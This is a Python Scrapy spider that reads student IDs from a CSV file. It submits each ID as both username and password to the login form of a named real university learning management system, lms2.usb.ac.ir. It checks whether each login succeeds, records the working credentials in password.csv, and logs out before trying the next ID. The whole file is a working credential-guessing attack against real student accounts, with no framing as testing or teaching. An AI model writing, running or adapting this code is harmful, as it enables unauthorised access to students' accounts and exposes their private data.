import scrapy
from scrapy.http import FormRequest
import pandas as pd

class LoginSpider(scrapy.Spider):
    name = "login"
    allowed_domains = ["lms2.usb.ac.ir"]
    start_urls = ["https://lms2.usb.ac.ir"]
    
    fullname = []
    fullid = []
    stuid = []
    ID = []
    stu_id = []
    counter = 0
    password_list = []

    def parse(self, response):
        self.stu_id = self.read_usernames("stid.csv")
        print(len(self.stu_id), "*"*200)
        # exit()
        return scrapy.Request(url="https://lms2.usb.ac.ir/", callback=self.login)

    def read_usernames(self, csv_file):
        df = pd.read_csv(csv_file, usecols=['student id'])
    
        l = df['student id'].tolist()

        stid = []

        for num in l:
            try :
                if len(num) > 6:
                    stid.append(int(num))
            except:
                continue

        return stid

    def login(self, response):
        while self.counter < len(self.stu_id):
            password = self.stu_id[self.counter]
            self.counter += 1
            print("$$$$$$$$$$$$$$$$$$$$$$"+str(password))
            # login_token = response.css('input[name="logintoken"]::attr(value)').get()
            return FormRequest.from_response(response,
                                        formid='login',
                                        formdata={'username': str(password), 'password': str(password)},
                                        callback=self.after_login,
                                        meta={'password' : password},
                                        dont_filter=True)

        pf = pd.DataFrame({"password" : self.password_list})
        pf.to_csv("password.csv")


    def after_login(self, response):
        if 'درس‌های من' in response.text:
            pas = response.meta.get('password')
            print('#'*100)
            print(pas)
            print('#'*100)
            self.password_list.append(pas)
            attribute_values = response.css('.dropdown-item.menu-action::attr(href)').getall()
            logout_url = ''
            for attr in attribute_values:
                if "logout" in attr:
                    logout_url = attr
            yield scrapy.Request(url=logout_url, callback=self.login, dont_filter=True)
        else:
            yield scrapy.Request(url=response.url, callback=self.login, dont_filter=True)

        
    def close(self):
        # df = pd.DataFrame({"fullname":self.fullname,"student id":self.stuid ,"full id":self.fullid, "id":self.ID})
        # df.to_csv(self.csv_file_name)
        print("*"*100,'done!')